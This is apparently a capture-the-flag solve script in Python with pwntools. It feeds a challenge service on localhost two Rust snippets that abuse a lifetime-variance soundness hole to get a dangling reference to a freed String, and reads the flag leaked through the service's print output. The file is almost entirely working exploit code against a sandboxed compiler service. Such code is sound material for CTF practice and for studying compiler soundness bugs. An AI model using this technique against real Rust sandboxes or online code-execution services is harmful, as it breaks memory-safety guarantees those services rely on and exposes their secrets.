from pwn import *

# TODO: Change to your own environment!
RHOST = "localhost"
RPORT = 10000

TEMPLATE_PART_1 = """
fn aux<'a, 'b, T>(_: Option<&'a &'b ()>, v: &'b T) -> &'a T { v }

fn exp<'c, 'd, T>(x: &'c T) -> &'d T {
    let f: fn(Option<&'d &'d ()>, &'c T) -> &'d T = aux;
    f(None, x)
}
"""

TEMPLATE_PART_2 = """
{
    let local = String::from("%s");
    exp(&local)
}
"""

REGEX_N_CHARS = re.compile(r"^where there are ([0-9]+) chars in \"@@FLAG@@\".$")
REGEX_RESULT = re.compile(r"^\[([\+\-\!])\] my_proxy::print\(s: &str\) says: (.+)$")

PROMPT_BANNER_END = b"=====END=====\n\n"
PROMPT_PART_1 = b"Now supply the content of `part_1.in` in no more than 30 lines and 120 chars per line.\n"
PROMPT_PART_2 = b"Now supply the content of `part_2.in` in no more than 30 lines and 120 chars per line.\n"


def solve() -> tuple[bool, str | None]:
    with remote(RHOST, RPORT) as r:
        debug("Skipping banner")
        r.recvuntil(PROMPT_BANNER_END)
        debug("Fetching flag length")
        line_n_chars = r.recvline(keepends=False).strip()
        match REGEX_N_CHARS.match(line_n_chars.decode("utf-8")):
            case None:
                error(f"Cannot get flag length: {line_n_chars.decode('utf-8')}")
            case m:
                n_chars = int(m.group(1))
        info(f"Flag length: {n_chars}")
        bogus = cyclic(n_chars).decode("utf-8")
        debug("Sending content for `part_1.in`...")
        r.sendafter(PROMPT_PART_1, TEMPLATE_PART_1.encode("utf-8"))
        r.sendline(b"[END]")
        debug("Sending content for `part_2.in`...")
        r.sendafter(PROMPT_PART_2, (TEMPLATE_PART_2 % bogus).encode("utf-8"))
        r.sendline(b"[END]")
        r.recvline(keepends=False)
        line_result = r.recvline(keepends=False).strip()
        match REGEX_RESULT.match(line_result.decode("utf-8")):
            case None:
                error(f"Cannot get result: {line_result.decode('utf-8')}")
            case m:
                status = m.group(1)
                result = m.group(2)
        match status:
            case "+":
                if result.startswith("flag"):
                    return (True, result)
                else:
                    return (False, result)
            case _:
                return (False, None)


if __name__ == "__main__":
    okay, result = solve()
    if okay:
        success(f"Flag found: {result}")
    else:
        if result is not None:
            warn(f"Not flag: {result}")
        else:
            error("Failed")
